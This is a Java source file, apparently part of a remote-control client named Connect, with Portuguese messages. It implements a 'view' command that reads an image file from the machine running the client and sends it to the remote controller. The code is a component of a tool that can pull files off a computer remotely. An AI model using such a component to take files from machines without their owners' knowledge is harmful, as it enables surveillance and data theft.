package br.com.introcdc.connect.client.commands.file.navigation;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:37
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ClientFileComponents;
import br.com.introcdc.connect.client.components.ClientImageComponents;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.File;

public class ClientCommandView extends ClientCommand {

    public ClientCommandView() {
        super("view");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("Digite um arquivo!");
            return;
        }
        File file = ClientFileComponents.file(input);
        if (!file.exists() || file.isDirectory()) {
            msg("Arquivo não encontrado!");
            return;
        }
        String name = file.getName().toLowerCase();
        if (!name.endsWith(".png") && !name.endsWith(".jpg") && !name.endsWith(".jpeg") && !name.endsWith(".webp") && !name.endsWith(".bmp") && !name.endsWith(".gif")) {
            msg("Formato de arquivo inválido!");
            return;
        }

        BufferedImage image = ImageIO.read(file);
        if (image == null) {
            msg("O arquivo selecionado não é uma imagem válida ou está corrompido!");
            return;
        }

        msg("Enviando visualização do arquivo " + file.getName() + "...");
        msg("view-image");
        ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> new Thread(() -> ClientImageComponents.sendImage(5, image)).start()), Connect.DELAY, Connect.DELAY_TYPE);
    }

}
